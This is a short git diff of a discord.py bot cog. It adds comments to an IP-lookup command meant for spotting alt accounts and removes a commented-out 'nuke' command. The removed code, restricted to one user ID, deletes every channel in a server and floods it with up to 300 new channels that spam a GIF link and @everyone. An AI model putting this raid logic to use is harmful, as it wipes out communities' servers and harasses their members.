@@ -15,6 +15,8 @@ class special(commands.Cog):
         await ctx.channel.purge(limit=amount)
         await ctx.send(f'Cleared {amount} messages', delete_after=5.0)
 
+    #look u infomration on an ip, helpful for detecting alts
+    #im too lazy to rework this with actual json stuff like []
     @commands.command(help='ip')
     async def ip(self, ctx, ip):
         def delete(ptr2):
@@ -81,28 +83,6 @@ class special(commands.Cog):
             description=f"{result}",
             color=0x19B9B9)
         await ctx.send(embed=embed)
-
-    """@commands.command(pass_context=True, help='heh')
-    async def nuke(self, ctx, channelnukename="bruh"):
-        user = ctx.author.id
-        if ctx.guild.id == 603084195102851073:
-            await ctx.channel.send("fucked up")
-        else:
-            if user == 414931767129276428:
-                await ctx.message.delete()
-                guild = ctx.guild
-                count = 0
-                message = "https://tenor.com/view/nae-nae-gif-18057748"
-                for channel in guild.channels:
-                    await channel.delete()
-                while count < 300:
-                    await guild.create_text_channel(channelnukename)
-                    channel = guild.channels[count]
-                    await channel.send(message)
-                    await channel.send("@everyone")
-                    count += 1
-            else:
-                await ctx.send("Bruh")"""
 
     @commands.command(pass_context=True, help='resets a server')
     async def reset(self, ctx):
